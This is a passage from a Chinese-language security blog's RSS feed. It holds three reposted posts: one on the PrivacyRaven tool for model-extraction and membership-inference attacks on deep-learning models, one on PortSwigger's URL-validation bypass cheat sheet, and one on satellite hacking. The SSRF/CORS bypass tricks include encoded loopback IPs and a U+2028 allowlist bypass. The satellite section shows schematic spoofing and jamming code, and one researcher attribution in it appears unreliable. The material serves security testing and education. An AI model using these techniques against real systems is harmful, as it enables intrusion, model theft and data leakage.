        <link>http://localhost:1313/p/privacyraven%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%9A%90%E7%A7%81%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 10:57:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/privacyraven%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%9A%90%E7%A7%81%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;深度学习系统的隐私危机&#34;&gt;深度学习系统的隐私危机
&lt;/h3&gt;&lt;p&gt;深度学习技术已广泛应用于欺诈检测、医疗诊断、自动驾驶等敏感领域，但这类系统存在严重隐私漏洞：攻击者可能窃取训练数据（成员推理攻击）、复制模型知识产权（模型提取攻击），甚至重建原始输入数据（模型反转攻击）。医疗CAT扫描诊断系统案例显示，即便仅返回&amp;quot;是/否&amp;quot;预测结果，攻击者仍能通过PrivacyRaven完整复现患者扫描影像。&lt;/p&gt;
&lt;h3 id=&#34;工具设计理念&#34;&gt;工具设计理念
&lt;/h3&gt;&lt;p&gt;PrivacyRaven通过三层设计解决现有安全工具易用性不足的问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;可用性&lt;/strong&gt;：支持自动化流程与手动控制双模式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;灵活性&lt;/strong&gt;：模块化架构允许自由组合不同论文中的攻击技术&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高效性&lt;/strong&gt;：15行代码即可发起完整攻击流程&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;核心攻击模拟&#34;&gt;核心攻击模拟
&lt;/h3&gt;&lt;h4 id=&#34;1-模型提取攻击&#34;&gt;1. 模型提取攻击
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;高精度模式&lt;/strong&gt;：用于商业窃取（如绕过MLaaS计费）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高保真模式&lt;/strong&gt;：用于后续攻击侦查&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;三阶段流程&lt;/strong&gt;：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 合成阶段：利用对抗样本生成数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 训练阶段：构建替代模型&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 再训练阶段：优化数据质量&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2-成员推理攻击&#34;&gt;2. 成员推理攻击
&lt;/h4&gt;&lt;p&gt;集成模型提取API实现标签推断攻击，可检测特定数据是否存在于训练集，医疗场景下可能泄露患者参与信息。&lt;/p&gt;
&lt;h4 id=&#34;3-模型反转攻击开发中&#34;&gt;3. 模型反转攻击（开发中）
&lt;/h4&gt;&lt;p&gt;通过逆向神经网络重建训练数据，如还原医疗影像原始数据集。&lt;/p&gt;
&lt;h3 id=&#34;技术实现特征&#34;&gt;技术实现特征
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 典型攻击示例（PyTorch Lightning模型）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;query_fn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wrap_model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;victim_model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 蓝框：模型封装&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;emnist_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_dataset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;EMNIST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 红框：种子数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;attack&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ModelExtractionAttack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;copycat_synthesizer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ImageNetTLClassifier&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 绿框：攻击配置&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;未来路线图&#34;&gt;未来路线图
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;可视化指标界面开发&lt;/li&gt;
&lt;li&gt;集成Optuna超参数优化&lt;/li&gt;
&lt;li&gt;联邦学习专用攻击模块&lt;/li&gt;
&lt;li&gt;差分隐私验证工具&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;防御新思路&#34;&gt;防御新思路
&lt;/h3&gt;&lt;p&gt;当前防御手段如差分隐私和状态检测仍不完善，PrivacyRaven的测试结果可能催生新型防护机制。该工具已开源，欢迎通过GitHub贡献代码（合成技术改进/攻击函数优化等）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;项目地址：&lt;code&gt;https://github.com/trailofbits/PrivacyRaven&lt;/code&gt;&lt;br&gt;
技术咨询：suha.hussain@trailofbits.com | @suhackerr&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>URL验证绕过速查表：全面解析SSRF与CORS绕过技术</title>
        <link>http://localhost:1313/p/url%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90ssrf%E4%B8%8Ecors%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sun, 03 Aug 2025 10:41:06 +0800</pubDate>
        
        <guid>http://localhost:1313/p/url%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90ssrf%E4%B8%8Ecors%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;引入url验证绕过速查表&#34;&gt;引入URL验证绕过速查表
&lt;/h1&gt;&lt;p&gt;URL验证绕过是众多漏洞的根本原因，包括许多SSRF（服务器端请求伪造）、CORS（跨源资源共享）配置错误和开放重定向实例。这些漏洞通过使用模糊URL触发URL解析差异并绕过验证。然而，许多这些技术由于缺乏文档而被忽视。为了解决这个问题，我们创建了一个速查表，整合所有已知的有效载荷，节省您从互联网上搜索和收集信息的时间和精力。今天，我们很高兴推出一个新工具：URL验证绕过速查表。&lt;/p&gt;
&lt;p&gt;我们希望您觉得它有用！这是一个频繁更新的存储库，包含所有已知技术，让您快速生成符合需求的单词列表。&lt;/p&gt;
&lt;h2 id=&#34;如何开始使用&#34;&gt;如何开始使用
&lt;/h2&gt;&lt;p&gt;URL验证绕过速查表是一个全新的交互式Web应用程序，根据您的上下文自动调整其设置。目前有三种上下文可用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;完全限定的绝对URL&lt;/strong&gt; - 适用于URL用于请求查询参数等情况。所有有效载荷都设计为与Burp Suite Intruder兼容，因此您无需担心正确的编码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;仅主机名&lt;/strong&gt; - 直接输入域名，例如在Host头值中。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CORS Origin&lt;/strong&gt; - 主机名用于有效的浏览器Origin头。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最初，速查表提供六种类型的有效载荷单词列表。高级设置允许您选择特定的单词列表或同时使用所有列表。以下是最重要的一些概述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;域名允许列表绕过&lt;/strong&gt;：专为域名混淆攻击设计。您可以通过输入允许的域名和攻击者域名来自定义测试域名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;伪造相对URL&lt;/strong&gt;：包括浏览器有效的绝对URL，这些URL可能会被客户端代码错误地验证。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;环回地址&lt;/strong&gt;：此单词列表包括IPv4、IPv6地址的各种表示及其规范化。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;编码&#34;&gt;编码
&lt;/h2&gt;&lt;p&gt;URL验证速查表支持几种类型的字符串编码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Intruder的百分比编码&lt;/strong&gt;：此选项通过将某些字符替换为代表字符UTF-8编码的一到四个转义序列来编码有效载荷字符串。它排除了Burp Suite Intruder的默认字符，并默认启用，使其与Burp Suite轻松兼容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全部编码&lt;/strong&gt;：此选项对所有非字母数字字符进行百分比编码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特殊字符&lt;/strong&gt;：编码除以下字符之外的所有字符：&lt;code&gt;[&amp;quot;!&amp;quot;,&amp;quot;$&amp;quot;,&amp;quot;&#39;&amp;quot;,&amp;quot;\&amp;quot;&amp;quot;,&amp;quot;(&amp;quot;,&amp;quot;)&amp;quot;,&amp;quot;*&amp;quot;,&amp;quot;,&amp;quot;,&amp;quot;-&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;/&amp;quot;,&amp;quot;\\&amp;quot;,&amp;quot;:&amp;quot;,&amp;quot;;&amp;quot;,&amp;quot;[&amp;quot;,&amp;quot;]&amp;quot;,&amp;quot;^&amp;quot;,&amp;quot;_&amp;quot;,&amp;quot;{&amp;quot;,&amp;quot;}&amp;quot;,&amp;quot;|&amp;quot;,&amp;quot;~&amp;quot;]&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Unicode转义&lt;/strong&gt;：此选项将有效载荷字符串表示为六字符转义序列&lt;code&gt;\uXXXX&lt;/code&gt;，除了以下字符：&lt;code&gt;[&#39;&amp;quot;&#39;,&#39;\\&#39;,&#39;\b&#39;,&#39;\f&#39;,&#39;\n&#39;,&#39;\r&#39;,&#39;\t&#39;]&lt;/code&gt;和范围&lt;code&gt;[0x0020 - 0x007f]&lt;/code&gt;内的字符。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：未编码的字符串应谨慎使用，因为Unicode值可能无法正确传输。&lt;/p&gt;
&lt;h2 id=&#34;高级设置&#34;&gt;高级设置
&lt;/h2&gt;&lt;h3 id=&#34;ipv4地址表示&#34;&gt;IPv4地址表示
&lt;/h3&gt;&lt;p&gt;在处理Web应用程序时，将IP地址编码为不同格式对于测试、验证和安全目的至关重要。速查表支持标准IPv4地址作为攻击者IP输入，并返回一系列编码表示，包括八进制、十六进制、二进制和十进制格式。它还将IPv4地址转换为其IPv6映射地址格式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;编码细节&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;八进制&lt;/strong&gt;：IP地址的每个段转换为八进制数并填充到4位。例如，环回IP地址&lt;code&gt;127.0.0.1&lt;/code&gt;将表示为&lt;code&gt;0177.0000.0000.0001&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;十六进制&lt;/strong&gt;：每个段转换为十六进制数，前缀为&lt;code&gt;0x&lt;/code&gt;，并填充到2位。相同的环回IP地址将为&lt;code&gt;0x7F.0x00.0x00.0x01&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;二进制&lt;/strong&gt;：每个段转换为8位二进制数。示例IP地址将为&lt;code&gt;01111111.00000000.00000000.00000001&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;部分十进制&lt;/strong&gt;：将IP地址的第三和第四部分组合成一个十进制数：&lt;code&gt;127.0.1&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DWORD表示法&lt;/strong&gt;：整个IP地址转换为无符号32位整数：&lt;code&gt;2130706433&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;带溢出的DWORD表示法&lt;/strong&gt;：将先前转换的结果加上&lt;code&gt;2^32 * 10 = 45080379393&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IPv6映射地址&lt;/strong&gt;：将IPv4段转换为十六进制并格式化为标准IPv6映射地址。环回IP地址可以表示为&lt;code&gt;[::FFFF:7F00:0001]&lt;/code&gt;或&lt;code&gt;::FFFF:127.0.0.1&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;规范化&#34;&gt;规范化
&lt;/h3&gt;&lt;p&gt;单词列表包括许多利用Unicode字符串规范化的有效载荷。例如，以下字符的规范化会导致空字符串：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ZeroWidthSpace&lt;/code&gt;、&lt;code&gt;NegativeVeryThinSpace&lt;/code&gt;、&lt;code&gt;NegativeThinSpace&lt;/code&gt;、&lt;code&gt;NegativeMediumSpace&lt;/code&gt;、&lt;code&gt;NegativeThickSpace&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Word Joiner (U+2060)&lt;/code&gt;（&lt;code&gt;&amp;amp;NoBreak;&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Soft Hyphen Character U+00AD&lt;/code&gt;（&lt;code&gt;&amp;amp;shy;&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些技术可用于绕过Web应用程序防火墙（WAF）。另一个允许域名绕过的例子是当验证正则表达式允许多行字符串时。例如，如果使用正则表达式&lt;code&gt;^allowed_domain$&lt;/code&gt;，以下内容可以绕过验证：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;attacker_domain(U+2028)allowed_domain&lt;/code&gt;（行分隔符）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;attacker_domain(U+2029)allowed_domain&lt;/code&gt;（段落分隔符）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;致谢&#34;&gt;致谢
&lt;/h2&gt;&lt;p&gt;这个速查表离不开分享研究的Web安全社区。特别感谢：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gareth Heyes、&lt;/li&gt;
&lt;li&gt;James Kettle、&lt;/li&gt;
&lt;li&gt;Jann Horn、&lt;/li&gt;
&lt;li&gt;Liv Matan、&lt;/li&gt;
&lt;li&gt;Takeshi Terada、&lt;/li&gt;
&lt;li&gt;Orange Tsai、&lt;/li&gt;
&lt;li&gt;Nicolas Grégoire。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们在GitHub账户上发布了所有有效载荷：&lt;a class=&#34;link&#34; href=&#34;https://github.com/PortSwigger/url-cheatsheet-data&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/PortSwigger/url-cheatsheet-data&lt;/a&gt;，您可以通过创建新问题或更新JSON文件并提交拉取请求来为此速查表做出贡献。&lt;/p&gt;
&lt;p&gt;我们期待您使用我们的新URL验证绕过速查表发现有趣的内容！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>卫星黑客攻防实战：从历史漏洞到现代攻击链</title>
        <link>http://localhost:1313/p/%E5%8D%AB%E6%98%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E4%BB%8E%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%B0%E7%8E%B0%E4%BB%A3%E6%94%BB%E5%87%BB%E9%93%BE/</link>
        <pubDate>Sun, 03 Aug 2025 10:29:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%8D%AB%E6%98%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E4%BB%8E%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%B0%E7%8E%B0%E4%BB%A3%E6%94%BB%E5%87%BB%E9%93%BE/</guid>
        <description>&lt;h1 id=&#34;卫星黑客攻防&#34;&gt;卫星黑客攻防
&lt;/h1&gt;&lt;p&gt;作者：Austin Kaiser // 实习生&lt;/p&gt;
&lt;p&gt;卫星黑客攻击并非新鲜事。自1957年苏联发射首颗人造卫星Sputnik 1以来，卫星技术已从简单的无线电信号发射发展到量子加密通信。但伴随技术进步，安全威胁也日益严峻。&lt;/p&gt;
&lt;h2 id=&#34;历史重大攻击事件&#34;&gt;历史重大攻击事件
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;英国天空广播系统入侵&lt;/strong&gt;：攻击者组合使用后门植入、定制恶意软件和数据包嗅探技术，通过多层代理链掩盖行踪，造成数据泄露和业务中断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;星链网络干扰战&lt;/strong&gt;：2022年俄罗斯对乌克兰星链服务实施干扰攻击，SpaceX通过紧急固件更新增强抗干扰能力&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;前沿攻防技术&#34;&gt;前沿攻防技术
&lt;/h2&gt;&lt;h3 id=&#34;电压毛刺攻击&#34;&gt;电压毛刺攻击
&lt;/h3&gt;&lt;p&gt;SpaceX安全研究员Lennert Wouters通过自制modchip实施电压毛刺攻击，成功绕过星链终端的安全启动机制。该技术通过精确控制芯片供电电压，诱发异常行为从而获取root权限。&lt;/p&gt;
&lt;h3 id=&#34;空间系统虚拟靶场&#34;&gt;空间系统虚拟靶场
&lt;/h3&gt;&lt;p&gt;Antisyphon培训课程《空间系统网络安全入门》(ICSS)提供包含以下组件的虚拟环境：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;地面站模拟&lt;/strong&gt;：使用COSMOS开源系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;卫星模拟&lt;/strong&gt;：基于NASA核心飞行系统(cFS)和Hackstar构建容器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击工具链&lt;/strong&gt;：Python脚本实现完整RF攻击链&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实战攻击演示&#34;&gt;实战攻击演示
&lt;/h2&gt;&lt;h3 id=&#34;欺骗攻击&#34;&gt;欺骗攻击
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 修改卫星遥测数据转发地址的Python代码片段&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;spoof_telemetry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;original_packet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;hijacked_packet&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;original_packet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;destination_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.100&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 原地面站IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;new_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;10.0.0.50&amp;#34;&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;# 攻击者IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;transmit_to_satellite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hijacked_packet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;干扰攻击&#34;&gt;干扰攻击
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 生成干扰信号的Python实现&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;generate_jamming_signal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;randint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;send_radio_packet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;rf攻击链组合&#34;&gt;RF攻击链组合
&lt;/h3&gt;&lt;ol&gt;
